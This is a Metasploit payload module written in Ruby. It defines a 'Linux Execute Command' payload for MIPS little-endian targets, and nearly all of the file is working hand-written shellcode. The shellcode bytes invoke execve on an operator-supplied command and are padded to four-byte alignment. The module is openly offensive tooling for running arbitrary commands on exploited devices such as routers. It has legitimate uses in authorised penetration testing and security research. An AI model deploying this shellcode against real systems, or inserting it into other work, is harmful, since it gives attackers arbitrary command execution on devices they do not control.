##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 52

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Execute Command',
      'Description'   => %q{
        A very small shellcode for executing commands.
        This module is sometimes helpful for testing purposes as well as
        on targets with extremely limited buffer space.
         },
      'Author'        =>
        [
          'Michael Messner <devnull[at]s3cur1ty.de>', #metasploit payload
          'entropy@phiral.net'  #original payload
        ],
      'References'    =>
        [
          ['EDB', '17940']
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_MIPSLE,
      'Payload'       =>
        {
          'Offsets' => {} ,
          'Payload' => ''
        })
    )
    register_options(
      [
        OptString.new('CMD', [ true, "The command string to execute" ]),
      ])
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    return datastore['CMD'] || ''
  end

  def generate

    shellcode =
      "\x66\x06\x06\x24" + # li a2,1638
      "\xff\xff\xd0\x04" + # bltzal a2,4100b4
      "\xff\xff\x06\x28" + # slti a2,zero,-1
      "\xe0\xff\xbd\x27" + # addiu sp,sp,-32
      "\x01\x10\xe4\x27" + # addiu a0,ra,4097
      "\x1f\xf0\x84\x24" + # addiu a0,a0,-4065
      "\xe8\xff\xa4\xaf" + # sw a0,-24(sp)
      "\xec\xff\xa0\xaf" + # sw zero,-20(sp)
      "\xe8\xff\xa5\x27" + # addiu a1,sp,-24
      "\xab\x0f\x02\x24" + # li v0,4011
      "\x0c\x01\x01\x01"   # syscall 0x40404

    #
    # Constructs the payload
    #

    shellcode = shellcode + command_string + "\x00"

    # we need to align our shellcode to 4 bytes
    (shellcode = shellcode + "\x00") while shellcode.length%4 != 0

    return super + shellcode

  end
end
